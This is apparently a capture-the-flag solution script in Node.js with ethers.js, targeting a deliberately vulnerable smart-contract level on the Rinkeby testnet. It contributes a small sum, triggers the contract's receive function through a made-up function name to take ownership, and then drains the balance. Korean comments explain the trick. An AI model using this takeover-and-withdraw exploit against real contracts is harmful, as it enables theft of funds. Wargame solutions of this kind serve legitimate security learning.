const ethers = require("ethers");
require("dotenv").config({path : '../.env'});
log = console.log;
const instance = "0xbcAc2aE7E3Df8D34826d10892FAF3CEc6819889d"; // you should write the result of "newInstance.js"

(async () => {
  const Network = `https://rinkeby.infura.io/v3/${process.env.INFURA_KEY}`;
  const httpProvider = ethers.getDefaultProvider(Network);
  const account = new ethers.Wallet(
    process.env.METAMASK_PRIVATE_KEY,
    httpProvider
  );
  ABI = [
    "function contribute() public payable",
    "function getContribution() public view returns (uint)",
    "function withdraw() public",
    "function x() external payable"
     // ethers에서 receive function 지원을 안해서, 그냥 임의 함수명으로 작성
     // 없는 함수 호출 시, receive 함수가 호출된다는 특성을 이용
  ];

  const contract = new ethers.Contract(instance, ABI, account);

  // 1. send 0.0001 Ether
  await contract.contribute({value:ethers.utils.parseEther('0.0001'), gasLimit : 2e6});

  // 2. check contribution
  con = await contract.getContribution()
  log(`contribution : ${con}`)

  // 3. call receive function
  await contract.x({ value: ethers.utils.parseEther("0.0001"), gasLimit : 2e6});

  // 4. withdraw all balance
  await contract.withdraw({gasLimit : 2e6});

})();
